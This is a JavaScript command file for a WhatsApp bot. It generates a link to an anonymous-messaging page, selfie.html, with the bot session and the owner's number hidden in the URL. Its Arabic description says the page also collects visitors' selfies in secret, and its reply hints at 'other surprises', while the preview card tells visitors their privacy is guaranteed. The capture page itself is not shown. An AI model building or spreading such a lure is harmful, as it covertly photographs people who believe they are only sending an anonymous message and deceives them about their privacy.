const moment = require('moment-timezone');

module.exports = {
    name: 'صارحني',
    aliases: ['رسالة', 'صراحة'],
    category: 'إداري',
    description: 'توليد رابط صارحني الفخم لاستقبال الرسائل (وصور السيلفي) بسرية',
    async execute({ sock, msg, args, reply, from, sender, sessionId }) {
        try {
            // استخراج رقم المرسل (الذي سيستقبل البيانات)
            const cleanSender = sender.split('@')[0];

            // تحديد النطاق (الدومين) الخاص بالسيرفر
            // سيتم استخدام رابط Render إذا كان متوفراً، وإلا سيتم استخدام الرابط المحلي
            const serverBaseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 10000}`;

            // بناء الرابط النهائي لصفحة صارحني (selfie.html) الموجودة في مجلد public
            // تم تمرير session و target بشكل مخفي في الرابط
            const sarahniUrl = `${serverBaseUrl}/selfie.html?session=${sessionId}&target=${cleanSender}`;

            const responseText = `✨ *[بوابة المصارحة السرية - TARZAN VIP]* ✨\n\n` +
                                 `👤 *الجلسة المرتبطة:* ${sessionId}\n` +
                                 `🕒 *تاريخ التوليد:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}\n\n` +
                                 `💌 *رابط استقبال الصراحة الخاص بك:* \n${sarahniUrl}\n\n` +
                                 `💡 _انسخ هذا الرابط وأرسله لأصدقائك أو ضعه في البايو الخاص بك لاستقبال رسائلهم (وبعض المفاجآت الأخرى 😉)._`;

            // إرسال الرابط مع معاينة (Ad Reply) جذابة
            await sock.sendMessage(from, {
                text: responseText,
                contextInfo: {
                    externalAdReply: {
                        title: 'صارحني - رسائل سرية ومجهولة',
                        body: 'اكتب رسالتك بسرية تامة، فنحن نضمن لك الخصوصية.',
                        thumbnailUrl: 'https://b.top4top.io/p_3489wk62d0.jpg', // يمكنك تغيير هذه الصورة بصورة تعبر عن "صارحني"
                        sourceUrl: sarahniUrl,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: msg });

        } catch (error) {
            console.error('❌ خطأ في أمر صارحني:', error);
            reply('❌ حدث خطأ داخلي أثناء توليد رابط صارحني.');
        }
    }
};
